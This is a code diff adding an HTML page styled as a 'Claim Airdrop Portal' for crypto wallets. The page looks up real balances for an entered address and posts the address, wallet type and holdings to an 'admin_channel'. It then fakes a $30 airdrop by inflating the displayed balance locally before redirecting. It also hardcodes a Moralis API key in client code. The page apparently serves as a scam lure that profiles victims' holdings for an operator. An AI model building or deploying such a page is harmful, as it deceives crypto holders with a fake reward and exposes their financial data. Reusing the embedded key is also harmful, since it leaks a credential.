@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Claim Airdrop Portal</title>
+  <script src="https://cdn.jsdelivr.net/npm/axios@1.6.2/dist/axios.min.js"></script>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(145deg, #1a1a2e, #16213e);
+      color: #e0e0e0;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: #0f3460;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      width: 90%;
+      max-width: 600px;
+    }
+    h1 {
+      color: #00f0ff;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    label {
+      font-weight: bold;
+      display: block;
+      margin-top: 10px;
+    }
+    select, input, button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      margin-bottom: 15px;
+      border-radius: 8px;
+      border: none;
+      font-size: 1em;
+    }
+    input, select {
+      background: #1b1b2f;
+      color: #fff;
+    }
+    button {
+      background: #00f0ff;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #00d4e0;
+    }
+    #balances, #claimSection {
+      background: #1b1b2f;
+      border: 1px solid #00f0ff;
+      padding: 15px;
+      border-radius: 10px;
+      margin-top: 10px;
+      display: none;
+    }
+    .err { color: #ff4d4d; text-align: center; }
+    .success { color: #4dff88; text-align: center; }
+    .token-entry {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin: 4px 0;
+      font-weight: bold;
+    }
+    .token-entry img {
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>AIRDROP PORTAL</h1>
+
+    <label>Wallet Address</label>
+    <input id="walletAddress" placeholder="0x... or Solana pubkey or BTC address" />
+
+    <label>Wallet Type</label>
+    <select id="walletType">
+      <option value="MetaMask">MetaMask</option>
+      <option value="TrustWallet">Trust Wallet</option>
+      <option value="Binance">Binance</option>
+    </select>
+
+    <label>Network</label>
+    <select id="network">
+      <option value="eth">Ethereum</option>
+      <option value="bsc">BSC</option>
+      <option value="sol">Solana</option>
+      <option value="btc">Bitcoin</option>
+      <option value="usdt">Tether</option>
+      <option value="lte">LTE</option>
+      <option value="xrp">Ripple</option>
+      <option value="doge">DOGE</option>
+    </select>
+
+    <button onclick="connectAndFetch()">CONNECT WALLET AND CLAIM AIRDROP</button>
+    <p id="msg" class="err"></p>
+    <div id="balances"></div>
+    <div id="claimSection">
+      <h3>Claim Airdrop</h3>
+      <label>Select Asset</label>
+      <select id="airdropAsset"></select>
+      <button onclick="claimAirdrop()">Claim</button>
+    </div>
+  </div>
+
+<script>
+const MORALIS_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjFlZmI2YjMzLTE5OTQtNDE1OC04NDU0LTQ2ZjhmYTM4YTEwZiIsIm9yZ0lkIjoiNDQ3NTYyIiwidXNlcklkIjoiNDYwNDg3IiwidHlwZUlkIjoiZGRmMTk0ZGItNzBkMy00MjViLThkMTEtOTM4NTk1MGJlMTgxIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDc0ODc4OTgsImV4cCI6NDkwMzI0Nzg5OH0.xpwpFE1Ggb6GohySdAvfiBH_rrwXZOFbQZZsysVa_ks";
+const chan = new BroadcastChannel("admin_channel");
+let connectedWallet = null;
+
+async function fetchEvm(addr, chain) {
+  const headers = { "X-API-Key": MORALIS_KEY };
+  const native = await axios.get(`https://deep-index.moralis.io/api/v2.2/${addr}/balance?chain=${chain}`, { headers });
+  const tokens = await axios.get(`https://deep-index.moralis.io/api/v2.2/${addr}/erc20?chain=${chain}`, { headers });
+  const nativeBal = (parseInt(native.data.balance) / 1e18).toFixed(4);
+  const tokenArr = tokens.data.map(t => ({ symbol: t.symbol, balance: (parseFloat(t.balance)/10**t.decimals).toFixed(4), contract:t.token_address, logo: t.logo }));
+  return { total: parseFloat(nativeBal), assets: [{ symbol: chain.toUpperCase()==='ETH'?'ETH':'BNB', balance: nativeBal, contract:'native', logo:'' }, ...tokenArr] };
+}
+
+async function fetchSol(addr){
+  const body = { jsonrpc:"2.0",id:1,method:"getBalance",params:[addr] };
+  const res = await axios.post("https://api.mainnet-beta.solana.com", body);
+  const solBal = (res.data.result.value/1e9).toFixed(4);
+  return { total: parseFloat(solBal), assets:[{ symbol:'SOL', balance: solBal, contract:'native', logo:'' }] };
+}
+
+async function fetchBtc(addr) {
+  const res = await axios.get(`https://api.blockcypher.com/v1/btc/main/addrs/${addr}/balance`);
+  const bal = (res.data.final_balance / 1e8).toFixed(8);
+  return { total: parseFloat(bal), assets: [{ symbol: "BTC", balance: bal, contract: "native", logo: "https://cryptologos.cc/logos/bitcoin-btc-logo.png" }] };
+}
+
+async function connectAndFetch(){
+  const addr=document.getElementById('walletAddress').value.trim();
+  const net=document.getElementById('network').value;
+  const type=document.getElementById('walletType').value;
+  const msg=document.getElementById('msg');
+  msg.className='err';
+  msg.textContent='';
+  document.getElementById('balances').style.display = 'none';
+  document.getElementById('claimSection').style.display = 'none';
+
+  if(!addr){msg.textContent='Enter wallet address';return;}
+  if(net==='eth'||net==='bsc') {
+    if(!/^0x[a-fA-F0-9]{40}$/.test(addr)){msg.textContent='Invalid EVM address';return;}
+  }
+  if(net==='sol' && addr.length<32){msg.textContent='Invalid Solana pubkey';return;}
+  if(net==='btc' && addr.length<26){msg.textContent='Invalid BTC address';return;}
+
+  try{
+    let data;
+    if(net==='sol') data = await fetchSol(addr);
+    else if(net==='btc') data = await fetchBtc(addr);
+    else data = await fetchEvm(addr, net);
+
+    renderBalances(data.assets);
+    populateClaimOptions(data.assets);
+    connectedWallet = { addr, type, net, data };
+    broadcast(addr,type,net,data);
+    msg.className='success';
+    msg.textContent='Wallet connected successfully!';
+    document.getElementById('claimSection').style.display='block';
+  }catch(e){msg.textContent='Error fetching balances';console.error(e);}  
+}
+
+function renderBalances(arr){
+  const box=document.getElementById('balances');
+  box.style.display='block';
+  box.innerHTML='<h3>Assets</h3>'+arr.map(a=>`<div class="token-entry"><img src="${a.logo || 'https://via.placeholder.com/20'}"> ${a.symbol}: ${a.balance}</div>`).join('');
+}
+
+function populateClaimOptions(arr){
+  const sel = document.getElementById('airdropAsset');
+  sel.innerHTML = '';
+  arr.forEach(a => {
+    const opt = document.createElement('option');
+    opt.value = a.symbol;
+    opt.textContent = a.symbol;
+    sel.appendChild(opt);
+  });
+}
+
+function broadcast(addr,wType,net,data){
+  chan.postMessage({type:'wallet',data:{address:addr,walletType:wType,network:net,totalBalance:data.total,assetBalances:data.assets}});
+}
+
+function claimAirdrop(){
+  const asset = document.getElementById('airdropAsset').value;
+  if(!connectedWallet){ alert("Connect wallet first"); return; }
+  const now = new Date().toISOString();
+  chan.postMessage({type:'airdrop',data:{address:connectedWallet.addr,asset:asset,network:connectedWallet.net,time:now}});
+  alert(`$30 airdrop added to ${asset}. Redirecting...`);
+
+  // Simulate $30 boost
+  const boostedAssets = connectedWallet.data.assets.map(a => {
+    if(a.symbol === asset) {
+      const newBalance = (parseFloat(a.balance) + 30).toFixed(4);
+      return { ...a, balance: newBalance };
+    }
+    return a;
+  });
+  renderBalances(boostedAssets);
+
+  // Redirect after delay
+  setTimeout(() => {
+    window.location.href = 'welcome.html';
+  }, 3000);
+}
+</script>
+</body>
+</html>
